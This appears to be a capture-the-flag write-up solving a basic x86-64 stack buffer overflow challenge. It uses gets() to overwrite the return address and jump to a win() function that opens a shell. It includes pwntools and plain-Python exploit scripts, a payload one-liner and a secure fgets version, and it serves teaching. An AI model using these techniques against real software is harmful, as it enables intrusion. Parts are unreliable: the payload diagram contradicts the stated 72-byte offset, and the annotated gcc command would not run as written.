---
title: Buffer Overflow Basic - Write-up
date: 2024-10-05
categories:
  - Binary Exploitation
tags:
  - Buffer Overflow
  - Stack
  - Pwn
---

# 💣 Buffer Overflow Basic

!!! info "Challenge Info"
    - **Event**: PwnCollege
    - **Category**: Binary Exploitation (Pwn)
    - **Difficulty**: Easy
    - **Points**: 200
    - **Architecture**: x86-64 Linux

## 📋 Challenge Description

> Learn basic buffer overflow exploitation. Overflow the buffer to control the return address and get shell access.

**Files**: `vuln` (ELF binary), `vuln.c` (source code)

**Goal**: Execute `/bin/sh` to get the flag

---

## 🔍 Reconnaissance

### File Information

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec vuln
[*] '/path/to/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found      ← ✅ Exploitable!
    NX:       NX disabled           ← ✅ Can execute shellcode
    PIE:      No PIE                ← ✅ Fixed addresses
```

!!! success "Vulnerability Indicators"
    - ❌ No stack canary → buffer overflow possible
    - ❌ NX disabled → can execute code on stack
    - ❌ No PIE → addresses are predictable

### Source Code Analysis

```c title="vuln.c" hl_lines="6 10"
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // ← Vulnerable function!
    printf("Hello, %s!\n", buffer);
}

void win() {
    system("/bin/sh");  // ← Target function!
}

int main() {
    vuln();
    return 0;
}
```

!!! danger "Vulnerability"
    `gets()` function **doesn't check buffer size** → perfect for overflow!

---

## 🛠️ Exploitation Strategy

### Attack Plan



```mermaid
graph LR
    A["Send Payload"] --> B["Overflow Buffer"]
    B --> C["Overwrite RBP"]
    C --> D["Overwrite Return Address"]
    D --> E["Jump to win()"]
    E --> F["Get Shell!"]
```

### Stack Layout

```
Higher Addresses
┌─────────────────┐
│  Return Address │  ← Need to overwrite this
├─────────────────┤
│   Saved RBP     │
├─────────────────┤
│   buffer[64]    │  ← Our input goes here
│                 │
└─────────────────┘
Lower Addresses
```

**Calculation:**
- Buffer size: 64 bytes
- Saved RBP: 8 bytes (64-bit)
- **Offset to return address: 64 + 8 = 72 bytes**

---

## 🔧 Finding the Offset

### Method 1: Pattern Generation

```bash
# Generate unique pattern
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Run in gdb
$ gdb vuln
gdb> run
Enter your name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[1]    Segmentation fault

gdb> x/x $rsp
0x7fffffffdec8: 0x4138624137624136

# Find offset
$ msf-pattern_offset -q 0x4138624137624136
[*] Exact match at offset 72
```

!!! success "Offset Found"
    **72 bytes** to reach return address

### Method 2: Manual Calculation

```python
# Buffer: 64 bytes
# RBP: 8 bytes (x64)
offset = 64 + 8  # = 72
```

---

## 🎯 Finding win() Address

```bash
$ objdump -d vuln | grep win
0000000000401142 <win>:
```

!!! info "Target Address"
    `win()` function at **0x401142**

---

## 💻 Exploitation

### Python Exploit Script

```python title="exploit.py"
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vuln'
elf = ELF(binary)

# Addresses
win_addr = 0x401142  # Address of win()

# Build payload
offset = 72
payload = b'A' * offset           # Fill buffer + RBP
payload += p64(win_addr)          # Overwrite return address

# Launch exploit
if args.REMOTE:
    p = remote('challenge.server', 1337)
else:
    p = process(binary)

# Send payload
p.sendlineafter(b'Enter your name: ', payload)

# Get shell
p.interactive()
```

### Manual Exploit (No pwntools)

```python title="exploit_manual.py"
#!/usr/bin/env python3
import struct
from subprocess import Popen, PIPE

# Configuration
win_addr = 0x401142

# Build payload
offset = 72
payload = b'A' * offset
payload += struct.pack('<Q', win_addr)  # Little-endian 64-bit

# Execute
p = Popen(['./vuln'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
output, error = p.communicate(payload)

print(output.decode())
```

### Using Python One-liner

```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x42\x11\x40\x00\x00\x00\x00\x00')" | ./vuln
```

---

## 🚩 Getting the Flag

```bash
$ python3 exploit.py
[+] Starting local process './vuln': pid 12345
[*] Switching to interactive mode

$ whoami
ctf
$ cat flag.txt
pwn{buff3r_0v3rfl0w_m4st3r_2024}
$ exit
```

!!! success "Flag! 🎉"
    ```
    pwn{buff3r_0v3rfl0w_m4st3r_2024}
    ```

---

## 🔬 Debugging Tips

### GDB Commands

```bash
# Set breakpoint at vuln()
gdb> break vuln
gdb> run

# Examine stack after input
gdb> x/30gx $rsp

# See disassembly
gdb> disas vuln

# Check registers
gdb> info registers

# Continue execution
gdb> continue
```

### Visual Stack Inspection

```bash
# Install pwndbg or gef for better GDB
$ git clone https://github.com/pwndbg/pwndbg
$ cd pwndbg
$ ./setup.sh

# Now in GDB:
gdb> stack 20
gdb> context
```

---

## 🛡️ Mitigations

### Why This Works

| Protection | Status | Impact |
|------------|--------|--------|
| Stack Canary | ❌ Disabled | Would detect overflow |
| NX/DEP | ❌ Disabled | Would prevent shellcode |
| ASLR | ❌ Disabled | Would randomize addresses |
| PIE | ❌ Disabled | Would randomize code |

### Secure Version

```c title="vuln_secure.c" hl_lines="5"
#include <stdio.h>

void vuln() {
    char buffer[64];
    fgets(buffer, sizeof(buffer), stdin);  // ✅ Bounds checking
    printf("Hello, %s!\n", buffer);
}

int main() {
    vuln();
    return 0;
}
```

**Compile with protections:**
```bash
gcc vuln_secure.c -o vuln_secure \
    -fstack-protector-all \    # Stack canary
    -D_FORTIFY_SOURCE=2 \      # Buffer overflow detection
    -z now -z relro \          # Full RELRO
    -pie                        # Position independent
```

---

## 🎓 Key Concepts

### Buffer Overflow Basics

1. **Buffer**: Fixed-size memory region
2. **Overflow**: Write beyond buffer boundary
3. **Return Address**: Where function returns to
4. **Exploitation**: Overwrite return to control execution flow

### Attack Vector

```
Input (100 bytes) → Buffer (64 bytes) → Overflow!
                                        ↓
                            Overwrite saved RBP (8 bytes)
                                        ↓
                            Overwrite return address (8 bytes)
                                        ↓
                            Jump to win() → Shell!
```

---

## 📊 Payload Structure

```
┌──────────────────────┬──────────┬──────────────┐
│   'A' × 72           │ RBP      │   win_addr   │
│   (Buffer + Padding) │ (junk)   │  0x401142    │
└──────────────────────┴──────────┴──────────────┘
        72 bytes          8 bytes      8 bytes
```

---

## 🎯 Key Takeaways

- [x] Identified buffer overflow via `gets()`
- [x] Calculated offset to return address (72 bytes)
- [x] Found target function address with `objdump`
- [x] Built exploit payload with Python
- [x] Got shell and captured flag
- [x] Learned about modern protections

---

## 📚 References

- [Buffer Overflow - OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [Pwntools Documentation](https://docs.pwntools.com/)
- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [PwnCollege](https://pwn.college/)

---

**Solved by**: Vuong Dat | **Date**: October 5, 2024
